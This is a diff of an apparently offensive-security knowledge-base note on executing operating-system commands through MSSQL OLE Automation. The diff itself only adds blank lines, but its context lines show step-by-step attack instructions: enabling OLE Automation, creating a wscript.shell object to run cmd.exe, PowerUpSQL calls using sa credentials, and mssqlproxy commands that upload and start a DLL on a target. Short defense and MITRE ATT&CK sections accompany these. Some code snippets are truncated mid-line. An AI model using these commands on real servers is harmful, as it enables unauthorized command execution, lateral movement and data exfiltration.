@@ -37,11 +37,15 @@ MSSQL OLE Automation Command Execution is a technique that allows an attacker to
 
 MSSQL OLE Automation Command Execution is a technique that allows an attacker to execute commands on a MSSQL Server using OLE automation procedures. This technique requires the attacker to have access to the SQL Server with privileges to enable OLE Automation. Once enabled, the attacker can execute arbitrary commands using the sp_OACreate and sp_OAMethod stored procedures. This technique can be used to gain persistence, move laterally, and exfiltrate data.
 
+ 
+
 ## Requirements
 
 1. Access to the MSSQL Server with privileges to enable OLE Automation
 
 1. Knowledge of the sp_OACreate and sp_OAMethod stored procedures
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ MSSQL OLE Automation Command Execution is a technique that allows an attacker to
 1. Restrict privileges for enabling OLE Automation
 
 1. Monitor for suspicious activity related to OLE Automation procedures
+
+ 
 
 ## Objectives
 
@@ -61,19 +67,31 @@ MSSQL OLE Automation Command Execution is a technique that allows an attacker to
 
 1. Exfiltrate data from the MSSQL Server
 
+ 
+
 # Instructions
 
 1. Use this command to execute a command on a SQL Server instance using the sa login credentials. Replace <DBSERVERNAME\DBInstance> with the name of your SQL Server instance and database instance. The command parameter should be replaced with the command you want to execute. The Verbose switch can be added to display detailed output.
 
+ 
+
+
+
 **Code**: [[Invoke-SQLOSCmdOle -Username sa -Password Password]]
 
+
+
 > This command allows you to execute a command on a SQL Server instance using the sa login credentials. The command parameter should be replaced with the command you want to execute. The Verbose switch can be added to display detailed output. This command can be useful for automating tasks or troubleshooting SQL Server issues.
+
+
 
 **Command** ([[Check current user]]):
 
 ```bash
 whoami
 ```
+
+
 
 2. To enable OLE Automation and execute commands, follow these steps:
 1. Run the following commands to enable OLE Automation:
@@ -87,8 +105,14 @@ EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
 EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
 Note: Replace the command after '/c' with your desired command.
 
+ 
+
+
+
 **Code**: [[# Enable OLE Automation
 EXEC sp_configure 'show ad]]
+
+
 
 > This command enables OLE Automation and allows the execution of commands using the 'wscript.shell' object. The 'DECLARE' statement creates a variable to store the object, and the 'EXEC SP_OACREATE' statement creates the object. The 'EXEC SP_OAMETHOD' statement executes the 'run' method of the object, which runs the specified command. Replace the command after '/c' with your desired command.
 
@@ -103,9 +127,17 @@ EXEC sp_configure 'show ad]]
    SQL> enable_ole
    SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
 
+ 
+
+
+
 **Code**: [[# https://github.com/blackarrowsec/mssqlproxy/blob]]
 
+
+
 > The above commands install the MSSQL Proxy tool on the target system and inject a DLL named 'reciclador.dll' into the system. The DLL is uploaded to the 'C:\windows\temp' directory. The 'enable_ole' command enables OLE automation procedures, which are required for the DLL to execute. Once the DLL is injected, it can be used to execute arbitrary code on the target system.
+
+
 
 **Command** ([[Install MSSQL client]]):
 
@@ -113,11 +145,19 @@ EXEC sp_configure 'show ad]]
 python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
 ```
 
+
+
+
+
 **Command** ([[Check Reciclador]]):
 
 ```bash
 python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
 ```
+
+
+
+
 
 **Command** ([[Start Reciclador]]):
 
@@ -125,17 +165,27 @@ python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador '
 python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
 ```
 
+
+
+
+
 **Command** ([[Enable OLE]]):
 
 ```bash
 SQL> enable_ole
 ```
 
+
+
+
+
 **Command** ([[Upload Reciclador.dll]]):
 
 ```bash
 SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -163,3 +213,5 @@ SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
 - [[Execute commands using OLE automation procedures]]
 - [[MSSQL Server]]
 - [[OLE Automation]]
+
+
